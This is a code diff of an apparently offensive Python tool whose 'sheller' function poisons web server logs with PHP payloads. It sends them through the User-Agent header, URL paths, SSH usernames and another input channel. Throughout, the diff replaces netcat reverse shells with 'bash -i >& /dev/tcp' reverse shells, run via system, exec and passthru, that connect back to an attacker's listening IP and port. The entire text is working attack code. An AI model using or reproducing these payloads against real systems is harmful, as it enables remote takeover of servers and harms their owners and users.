@@ -575,17 +575,17 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             prep = s.prepare_request(req)
 
         if technique == 1:
-            prep.headers['User-agent'] = '<?php system("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            prep.headers['User-agent'] = '<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                 print("Timeout reached @technique 1")
-            prep.headers['User-agent'] = '<?php exec("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            prep.headers['User-agent'] = '<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                 print("Timeout reached @technique 1")
-            prep.headers['User-agent'] = '<?php passthru("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            prep.headers['User-agent'] = '<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
@@ -593,17 +593,17 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
         elif technique == 2:
             req = requests.Request(method='GET', url=url)
             prep2 = s.prepare_request(req)
-            prep2.url = url + "/" + '<?php system("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            prep2.url = url + "/" + '<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep2, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                 print("Timeout reached @technique 2")
-            prep2.url = url + "/" + '<?php exec("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            prep2.url = url + "/" + '<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep2, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                 print("Timeout reached @technique 2")
-            prep2.url = url + "/" + '<?php passthru("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            prep2.url = url + "/" + '<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)
             try:
                 s.send(prep2, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
@@ -617,9 +617,9 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             if "@" in tmp:
                 tmp = tmp.split("@")[1]
             host = tmp.split("/")[0].split(":")[0]
-            sshs = ['<?php system("nc -e /bin/sh {} {}"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
-            '<?php exec("nc -e /bin/sh {} {}"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
-            '<?php passthru("nc -e /bin/sh {} {}"); ?>@{}'.format(LISTENIP, LISTENPORT, host)]
+            sshs = ['<?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
+            '<?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
+            '<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host)]
             for ssh in sshs:
                 try:
                     subprocess.call(["ssh", ssh])
@@ -633,9 +633,9 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             tmp = url.split("://")[1]
             if "@" in tmp:
                 tmp = tmp.split("@")[1]
-            topics = ['I<3shells <?php system("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT), 
-            'I<3shells <?php exec("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT), 
-            'I<3shells <?php passthru("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)]
+            topics = ['I<3shells <?php system("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT), 
+            'I<3shells <?php exec("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT), 
+            'I<3shells <?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>'.format(LISTENIP, LISTENPORT)]
             host = tmp.split("/")[0].split(":")[0]
             for topic in topics:
                 try:
